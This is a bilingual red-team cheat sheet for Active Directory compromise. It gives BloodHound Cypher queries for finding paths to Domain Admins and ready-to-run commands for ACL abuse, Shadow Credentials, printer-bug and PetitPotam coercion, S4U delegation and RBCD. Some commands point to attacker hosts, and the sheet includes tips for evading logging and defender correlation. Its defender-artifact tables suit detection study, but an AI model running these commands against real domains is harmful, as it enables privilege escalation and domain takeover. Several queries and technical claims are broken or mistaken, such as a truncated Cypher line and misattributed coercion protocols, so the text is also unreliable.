# ad-acl-deleg--deep — ad

## Advanced References: ACL Abuse, Delegation & BloodHound Cypher (Continued)

### 1. Advanced Cypher — Rare but High-Value Queries

Basic queries (`ShortestPathsToDomainAdmins`, `FindAllPaths`) are usually already covered. Here are advanced queries that are often missed:

```cypher
// 1. Principal dengan hak tulis ke OU yang berisi komputer DC (jalur tidak langsung ke DA)
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDACL|Owns*1..]->(o:OU)
WHERE o.distinguishedname =~ '(?i).*Domain Controllers.*'
RETURN p

// 2. Jalur ke Tier-0 tanpa melalui grup yang sudah diketahui "berisik"
MATCH p=shortestPath((u:User {enabled:true})-[:MemberOf|AdminTo|GenericAll|WriteDACL|ForceChangePassword|AddKeyCredentialLink|AllowedToAct|AllowedToDelegate|AddMember|WriteOwner*1..6]->(g:Group))
WHERE g.objectid ENDS WITH '-512' AND NOT ANY(r IN relationships(p) WHERE r.relation = 'MemberOf' AND endNode(r).name = 'Domain Admins')
RETURN p

// 3. Siapa yang bisa mengambil alih akun kerberoastable
MATCH (u:User)-[:GenericAll|GenericWrite|ForceChangePassword|WriteDACL|Owns]->(t:User {hasspn:true})
RETURN u.name, type(last(relationships(...)))  // atau sederhanakan: RETURN u.name, t.name

// 4. Shadow Credentials surface (msDS-KeyCredentialLink)
MATCH p=(n)-[:AddKeyCredentialLink|GenericWrite|GenericAll]->(t)
WHERE t.enabled = true
RETURN p

// 5. WriteDACL ke domain head (domain object sendiri)
MATCH p=(u)-[:WriteDACL|GenericAll|Owns]->(d:Domain)
RETURN p

// 6. Certificate template ESC surface (jika collector certipy/ADCS terpasang)
MATCH p=(u)-[:Enroll|GenericAll|WriteDACL|Owns]->(ct:CertTemplate)
WHERE ct.enrolleesuppliessubject = true OR ct.authenticationenabled = true
RETURN p
```

**Jebakan Cypher:**
- `WriteDACL` in old BloodHound is often reported as `GenericAll` (derived). In BloodHound CE (v5+), the edge is remodeled—verify with `MATCH ()-[r]->() RETURN type(r), count(*)` before trusting path results.
- The `AddKeyCredentialLink` edge does not appear if the collector is < v4 `SharpHound`; run the latest collector.
- `AllowedToAct` (RBCD) only appears if `msDS-AllowedToActOnBehalfOfOtherIdentity` is set during collection.
- `CanRDP`/`CanPSRemote` often point to hosts that are already owned; filter `NOT endNode(r).owned = true` to focus on new targets.
- BloodHound CE stores `system_tags`; filter `WHERE NOT u.system_tags CONTAINS 'admin_tier_0'` to hide noise.

### 2. Varian Perangkat/Produk & Versi Schema

| Scenario | Tool | Important variant |
|---|---|---|
| GenericAll user | PowerView | `Set-DomainObjectOwner`, `Add-DomainObjectAcl`, `Set-DomainUserPassword -Identity X -AccountPassword (ConvertTo-SecureString ...)` |
| GenericAll user (Linux) | `bloodyAD` | `bloodyAD -u user -p pass -d dom add genericAll 'CN=target,CN=Users,DC=d,DC=l' attacker` (writes an ACE, not a direct exploit) |
| WriteDACL | `dacledit.py` (Impacket) | `-action write -rights FullControl -principal attacker -target 'CN=...'` |
| WriteDACL | PowerView | `Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights DCSync` (classic path to DCSync) |
| WriteDACL (newer) | `StandIn` (.NET) | `StandIn.exe --object "CN=..." --grant "DOMAIN\attacker" --rights FullControl` — does not require PowerShell logging |
| ForceChangePassword | net.exe / PowerView | `net user victim NewPass /domain`, or `Set-DomainUserPassword` |
| GenericWrite user (logon script) | PowerView | `Set-DomainObject -Identity victim -Set @{scriptpath='\\attacker\s\p.cmd'}` |
| GenericWrite user (SPN) | PowerView | `Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/evil'}` then `Get-DomainSPNTicket` |
| GenericWrite computer (RBCD setup) | PowerView/StandIn | tulis `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| AddKeyCredentialLink | Whisker / pyWhisker | `Whisker.exe add /target:user$ /domain:d.l /dc:dc.d.l` (Windows) ; `pywhisker.py -a add -t user -c <cert>` (Linux) |
| Owns | `Set-DomainObjectOwner` | Take ownership then `Add-DomainObjectAcl` for FullControl |

**Edge case terbaru:**
- **Windows Server 2022 + KB5023xx**: `ms-DS-MachineAccountQuota` is still default 10, but **event 4741** is tightened—some organizations lower it to 0; RBCD via a new computer account fails. Fallback: use an already-owned computer account.
- **Windows Server 2025**: `msDS-KeyCredentialLink` write via LDAP triggers **event 5136** with an `attributeValue` blob; modern defenders parse this.
- **`ForceChangePassword` on `userAccountControl` with the `DONT_EXPIRE_PASSWORD` flag**: password reset still succeeds, but the artifacts differ (see §6).
- **StandIn vs PowerView**: PowerView loads `System.Management.Automation` → detected by `ScriptBlockLogging`; StandIn (C#) avoids that, but whatever writes directly to LDAP still generates 5136.

### 3. Unconstrained Delegation — Varian & Edge Case

**Advanced discovery (not just `TRUSTED_FOR_DELEGATION`):**

```powershell
# Komputer + user unconstrained
Get-DomainComputer -Unconstrained | Select samaccountname, dnshostname
Get-DomainUser -Unconstrained  | Select samaccountname

# Deteksi "coffee" (TGT di memori) — target printer bug
# Cek Spooler di kandidat target
Get-DomainComputer -Filter '(operatingsystem=*Server*)' | % {
  try { Test-Path "\\$($_.dnshostname)\print$" } catch {}
}
```

**Printer Bug — varian trigger:**

| Trigger | Variant | Notes |
|---|---|---|
| MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx` | `printerbug.py`, `SpoolSample.exe`, `Rubeus.exe monitor` | Most classic |
| MS-EFSRPC (PetitPotam) | `PetitPotam.exe` | For unconstrained delegation, target = unconstrained host, capture DC TGT |
| MS-FSRVP | `dfscoerce.exe` | Server 2019+ |
| DFSCoerce / ShadowCoerce | impacket variant | Widely patched; verify first |
| MS-DFSNM | `dfscoerce` | |

**Setup listener & tangkap TGT:**
```
# Linux
ntlmrelayx.py -t ldap://dc.dom.local --delegate-access --escalate-user attacker$ 
# atau untuk unconstrained: --dump-tgt? (butuh modul capture)
# Windows
Rubeus.exe monitor /interval:5 /nowrap
# Trigger
python3 printerbug.py domain/user:pass@target-unconstrained attacker-ip
```

**Edge case unconstrained delegation 2023+:**
- **Server 2019+ with `Privileged Account Certificate` (PAC) mitigation** — does not automatically patch the printer bug.
- **Spooler disabled by default** in Windows Server 2022+ (KB5005xx) → printerbug fails; use PetitPotam/DFSCoerce.
- **The coerce host target must resolve to an unconstrained host**, not the DC. This is often wrong: trigger from host A to the DC so the DC TGT lands on the unconstrained host — it must be the *unconstrained* host that calls the DC, not the other way around. Configure `RpcRemoteFindFirstPrinterChangeNotificationEx` to call the unconstrained target **with** a reference to the DC.
- **Defender artifact**: Event 4624 Logon Type 3 from the DC `$` machine account to the unconstrained host, followed by 4768/4769 for the TGT. `System.Security.Security` logging + `Rubeus` in memory (ETW `Microsoft-Windows-Security-Auditing`).
- **BloodHound**: search `MATCH (u:Computer {unconstraineddelegation:true})` then `:-[:MemberOf*1..]->(g:Group)` to see the blast radius.

### 4. Constrained Delegation — S4U2Self / S4U2Proxy

**Discovery (ketat):**
```powershell
# User & computer
Get-DomainUser  -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
```
The `msds-allowedtodelegateto` value contains the target SPNs that **may** be delegated.

**S4U2Self (impersonate any user to your own service) vs S4U2Proxy (to the target service):**
- **S4U2Self** requires `TRUSTED_TO_AUTH_FOR_DELEGATION` (userAccountControl 0x1000000). If set **without** `msds-allowedtodelegateto`, we can impersonate anyone to **our own service account** — often overlooked.
- **S4U2Proxy** butuh `msds-allowedtodelegateto` berisi SPN target.

**Practical exploitation:**
```
# Impacket getST (S4U2Self + S4U2Proxy)
getST.py -spn cifs/target.dom.local -impersonate Administrator \
  -dc-ip dc.dom.local 'dom/svc:pass'
# jika -impersonate tanpa -spn, hanya S4U2Self
# Rubeus
Rubeus.exe s4u /user:svc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

**Varian penting:**
- **Alternate service (SPN-less S4U)**: `getST.py -altservice host/other` — the target SPN does not have to be in `msds-allowedtodelegateto`, just the service (cifs → host → http → winrm). This is a classic edge case that is often missed.
- **Protocol transition flag** (`TRUSTED_TO_AUTH_FOR_DELEGATION`) is required for S4U2Self *from* a non-Kerberos auth user. Without this flag, impersonation succeeds only if the user has already authenticated via Kerberos to the KDC, or if the target allows protocol transition.
- **Kerberos-only delegation (`msDS-AllowedToDelegateTo` + `userAccountControl` without the 0x1000000 flag)**: cannot be S4U2Self-obtained, but S4U2Proxy is still possible **if** we have a referral ticket from a user whose TGT we already possess.
- **Windows Server 2016+ / 2019**: `msDS-AllowedToDelegateTo` in the `msDS-AllowedToDelegateTo` field no longer updates automatically when the target SPN changes; defenders can trace 5136 on modification.

**Defender artifacts (CD):**
- 4768/4769 with `ServiceName` = target SPN, `Supplied Realm Name` from `svc$`.
- 4769 with non-empty **`Transited Services`** + `Ticket Options` 0x40810010 is the signature of DIY S4U2Proxy.
- Event 4624 logon type 3 on the target with `SubjectUserName` = target svc, `TargetUserName` = impersonated user (e.g. Administrator).
- **Event 5136** saat `msDS-AllowedToDelegateTo` diubah.
- Sysmon does not help; kerberos logging (Falcon/Defender for Identity) is more relevant.

### 5. RBCD (Resource-Based Constrained Delegation)

**Discovery:**
```cypher
// Siapa yang bisa menulis msDS-AllowedToActOnBehalfOfOtherIdentity ke komputer
MATCH p=(u)-[:GenericAll|GenericWrite|WriteDACL|Owns]->(c:Computer)
RETURN p
```
Checker lokal:
```
Get-DomainComputer -Filter '(msds-allowedtoactonbehalfofotheridentity=*)' | 
  Select samaccountname, msds-allowedtoactonbehalfofotheridentity
```

**Abuse flow (brief, not a re-setup):**
1. Siapkan attacker computer account (`StandIn` `addcomputer` / `impacket addcomputer.py` / `Powermad New-MachineAccount`).
2. Write the SD `msDS-AllowedToActOnBehalfOfOtherIdentity` (PowerView `Set-DomainObject` with binary SD; `rbcd.py` from Impacket; StandIn `--resource-computer`).
3. Obtain a service ticket with S4U2Proxy from the controlled computer account.
4. PTT and access.

**Varian & edge case:**
- **`rbcd.py` (Impacket)** only writes the SD; it does not perform S4U. Combine it with `getST.py`, or `StandIn` which combines them.
- **Computer account creation** is blocked by `ms-DS-MachineAccountQuota=0` → use a user account that has `GenericAll` on the target computer to write the attribute, **without** creating a new computer account (write the SD directly with the SID of a user/computer already owned).
- **Defender artifact RBCD**: 5136 for `msDS-AllowedToActOnBehalfOfOtherIdentity`; 4741 for computer account creation; 4624 type 3 on the target host with `ImpersonationLevel: Delegation` and `AuthenticationPackage: Kerberos`.
- **CAP/DC hardening**: counter-signal RBCD on the DC—change `ms-DS-MachineAccountQuota` to 0 and audit 5136 on `msDS-AllowedToAct*`.
- **S4U2Proxy with RBCD requires `TrustedToAuthForDelegation` on attacking account?** For a newly created computer account, that flag is **not** automatic—but RBCD on the resource allows S4U2Proxy without the flag (because the target attribute specifies it). This is often misunderstood: RBCD **does not** need the flag on the attacker side.

### 6. Defender Artifacts — Summary Table

| Technique | Windows Event | Important detail |
|---|---|---|
| All ACL attribute modifications | 5136 (Directory Service Changes) | `attributeLDAPDisplayName=ntSecurityDescriptor`, `objectClass=user`, `subjectUserSid` |
| ForceChangePassword / reset | 4723 (user) / 4724 (admin reset) | `TargetUserName` = korban; `SubjectUserName` = attacker |
| Perubahan password mandiri | 4723 | — |
| GenericWrite logon script | 5136 (`scriptPath`) | Also 5145 access to attacker share |
| SPN injection | 5136 (`servicePrincipalName`) | 4769 for ticket to new SPN |
| AddKeyCredentialLink | 5136 (`msDS-KeyCredentialLink`) | Binary payload; only 5136 with `op=Add` |
| Owns change | 5136 (`nTSecurityDescriptor`) | Often paired with 4662 `WriteDAC` |
| RBCD | 5136 (`msDS-AllowedToActOnBehalfOfOtherIdentity`) | Often without 4741 when using an existing account |
| Computer account creation | 4741 | `SubjectUserName` attacker |
| Printerbug | 4624 type 3 on unconstrained host from DC$ | `LogonProcess=Kerberos`, `AuthenticationPackage=Kerberos` |
| PetitPotam | 4624 type 3 + 4625 massal | Dependensi |
| Unconstrained capture | 4768 (TGT request) on DC, then 4624 on unconstrained host | `Rubeus monitor` does not show up; Sysmon does not help |
| S4U2Self | 4768, **4769 with empty `Transited Services`** | Often no target SPN in the log |
| S4U2Proxy | 4769 with `Transited Services` = target SPN | `Ticket Options: 0x40810010` |
| DCSync (from WriteDACL path) | 4662 with `Properties = {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` etc. | Not only from DA |
| BloodHound/SharpHound | No built-in event | ETW `Microsoft-Antimalware-Scan-Interface` + EDR; Sysmon detects mass LDAP queries via `EventID 1` + string |
| SharpHound via PowerShell | `4104` (ScriptBlock) sering berisi `Invoke-BloodHound` | — |
| Desired State Configuration abuse | 5136 + 4688 (`wmic`/`Invoke-DscResource`) | Edge case CER |

### 7. Operational Pitfalls (Brief)

- **`WriteDACL` → `DCSync` requires two steps**: (1) write the DCSync ACE to the domain object, (2) run DCSync. Many write the ACE to a user, not the domain → it does not work.
- **`GenericAll` on a `Group` does not automatically add a member to a Tier-0 group**: adding a member requires a new logon/kerberos session—re-login before access.
- **`GenericWrite` on a `Computer` = not RCE**: it can only write `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) or SPN (kerberoast) or `scriptPath` for the computer account—not something that executes.
- **ForceChangePassword on the `krbtgt` account**: not allowed without DCSync; resetting `krbtgt` twice triggers mass 4724—avoid.
- **RBCD to DC**: S4U2Proxy from DC to DC will trigger `S4U2Proxy` with the DC's `userAccountControl`—many modern DCs **reject** S4U2Proxy from a principal that is not `TrustedToAuthForDelegation` on the DC side. Test in a lab; do not assume.
- **Alternate SPN without S4U2Self**: `getST.py -altservice` only works after S4U2Proxy succeeds; it does not replace the flag.
- **StandIn `--escalate`** combines add computer + write SD + S4U — run it as a domain user, not local; it often fails because the `nTSecurityDescriptor` DACL cannot be written without a grant. Check the target's `GenericAll` first.
- **BloodHound CE vs Legacy**: the `WriteDACL` and `Owns` edges in CE have different semantics (ACE vs owner). A path that appears in CE **may** be manually non-viable, because edges derived from `WriteOwner` do not always write the SD.
- **Printerbug to a host with spooler disabled** (default Server 2022+): fails without a clear error—check `\\host\print$` first.
- **Unconstrained + coerce**: more and more organizations disable `RunAs`/Coerce, but PetitPotam on DC still often works if `MS-EFSRPC` is not patched. Confirm with the new version of `PetitPotam.py` (pathname `\c:\windows\` vs IPC).
- **Session hijack vs TGT capture on unconstrained**: Rubeus `monitor` captures the TGT on the unconstrained host—do not wait for an event; run the listener before the trigger, and ensure time is synchronized (skew > 5 minutes → TGT invalid).
- **`AddKeyCredentialLink` on DC**: almost always 5136, and modern Defender for Identity flags it as `ShadowCredentials`. Also be careful: `Whisker` triggers `4688` with child `certipy`/`Rubeus` if EDR is active.
- **Cleanup**: after RBCD abuse, remove `msDS-AllowedToActOnBehalfOfOtherIdentity` (StandIn `--cleanup`, `rbcd.py -delegate-to -restore`, or blank SD via `Set-DomainObject`). Modern Defender performs **temporal correlation**: RBCD write → 1 minute → S4U → 4624 → alarm.

---

## [reasoning trace]


